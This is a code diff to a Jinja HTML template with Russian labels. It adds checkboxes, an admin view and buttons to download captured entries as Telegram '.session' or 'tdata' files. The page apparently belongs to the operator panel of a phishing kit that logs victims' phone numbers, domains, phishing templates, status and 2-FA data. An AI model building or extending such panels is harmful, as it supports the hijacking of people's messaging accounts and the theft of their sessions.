@@ -11,7 +11,7 @@
 {% block body %}  
 {% include 'header.html' %}
 
-{% if not admin %}
+
 
 
 <section class="logs">
@@ -32,32 +32,64 @@
     
 
     <div class="main__table-container">
+        <div class="row">
+            <button class="btn" id="download_session">Скачать как .session</button>
+            <button class="btn" id="download_tdata">Скачать как tdata</button>
+            <button class="btn" id="remove_logs">Удалить</button>
+
+        </div>
+
+        {% if not admin %}
         <h3 class="main__table-title">Количество логов: {{ logs | length }}</h3>
-        <table>
+        
+        <table class="logs-table">
             <thead>
                 <tr>
                     <th>Телефон</th>
                     <th>Домен</th>
                     <th>Время</th>
                     <th>Шаблон</th>
+                    <th>Статус</th>
+                    <th>2-FA</th>
                 </tr>
             </thead>
             <tbody>
+                
                 {% for log in logs %}
-                <tr>
-                    <td>{{ log[0] }}</td>
-                    <td>{{ log[1] }}</td>
-                    <td class="datetime">{{ log[3] }}</td>
-                    <td>{{ log[5] }}</td>
+                <tr><td class="row"><input type="checkbox" class="log-checkbox">{{ log[0] }}</td><td>{{ log[1] }}</td><td class="datetime">{{ log[2] }}</td><td>{{ log[3] }}</td><td>{{ log[4] }}</td><td>{{ log[5] }}</td>
                 </tr>
                 {% endfor %}
             </tbody>
         </table>
+        {% else %}
+        <h3 class="main__table-title">Количество логов: {{ admin_logs | length }}</h3>
+
+        <table class="logs-table">
+            <thead>
+                <tr>
+                    <th>Телефон</th>
+                    <th>Логин</th>
+                    <th>Домен</th>
+                    <th>Время</th>
+                    <th>Шаблон</th>
+                    <th>Статус</th>
+                    <th>2-FA</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for log in admin_logs %}
+                <tr><td class="row"><input type="checkbox" class="log-checkbox">{{ log[1] }}</td><td>{{ log[0] }}</td><td>{{ log[2] }}</td><td class="datetime">{{ log[3] }}</td><td>{{ log[4] }}</td><td>{{ log[5] }}</td><td>{{ log[6] }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        <div class="hidden" id="admin">admin</div>
+        {% endif %}
+
     </div>
 
 </div>    
 </section>
-{% endif %}
 
 
 
